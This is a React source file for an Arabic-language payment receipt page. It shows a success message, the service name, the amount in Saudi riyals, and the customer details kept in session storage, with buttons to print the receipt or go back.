import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { getServiceBranding } from "@/lib/serviceLogos";
import PaymentRouterStandalone from "@/components/PaymentRouterStandalone";
import { CheckCircle, Download } from "lucide-react";

const StandalonePaymentReceiptPage = () => {
  const { id } = useParams();
  const navigate = useNavigate();

  return (
    <PaymentRouterStandalone>
      {(linkData) => {
        const serviceKey = linkData.service_key;
        const serviceName = linkData.service_name;
        const branding = getServiceBranding(serviceKey);
        const amount = linkData.cod_amount;
        const formattedAmount = `${amount} ر.س`;

        const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');

        const handleDownload = () => {
          window.print();
        };

        const handleBack = () => {
          navigate('/');
        };

        return (
          <div className="min-h-screen bg-background" dir="rtl">
            <div className="container mx-auto px-3 sm:px-4 py-8">
              <div className="max-w-2xl mx-auto">
                <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
                  <div className="text-center mb-8">
                    <div
                      className="w-20 h-20 sm:w-24 sm:h-24 rounded-full mx-auto mb-4 flex items-center justify-center"
                      style={{
                        background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                      }}
                    >
                      <CheckCircle className="w-10 h-10 sm:w-12 sm:h-12 text-white" />
                    </div>
                    <h1 className="text-2xl sm:text-3xl font-bold mb-2">تم الدفع بنجاح!</h1>
                    <p className="text-sm sm:text-base text-muted-foreground">
                      شكراً لك على استخدام خدمة {serviceName}
                    </p>
                  </div>

                  <div
                    className="rounded-lg p-4 sm:p-6 mb-6"
                    style={{
                      background: `${branding.colors.primary}10`,
                      border: `1px solid ${branding.colors.primary}30`
                    }}
                  >
                    <div className="space-y-3">
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">رقم العملية:</span>
                        <span className="font-mono">{id?.substring(0, 8).toUpperCase()}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">الخدمة:</span>
                        <span className="font-semibold">{serviceName}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">المبلغ:</span>
                        <span className="font-bold text-lg" style={{ color: branding.colors.primary }}>{formattedAmount}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">الاسم:</span>
                        <span>{customerInfo.name || '-'}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">البريد الإلكتروني:</span>
                        <span>{customerInfo.email || '-'}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">رقم الهاتف:</span>
                        <span>{customerInfo.phone || '-'}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">التاريخ:</span>
                        <span>{new Date().toLocaleString('ar-SA')}</span>
                      </div>
                    </div>
                  </div>

                  <div className="space-y-3">
                    <Button
                      onClick={handleDownload}
                      size="lg"
                      className="w-full text-sm sm:text-lg py-5 sm:py-7"
                      style={{
                        background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                      }}
                    >
                      <Download className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
                      <span>تحميل إيصال الدفع</span>
                    </Button>

                    <Button
                      onClick={handleBack}
                      variant="outline"
                      size="lg"
                      className="w-full"
                    >
                      العودة للرئيسية
                    </Button>
                  </div>
                </Card>
              </div>
            </div>
          </div>
        );
      }}
    </PaymentRouterStandalone>
  );
};

export default StandalonePaymentReceiptPage;
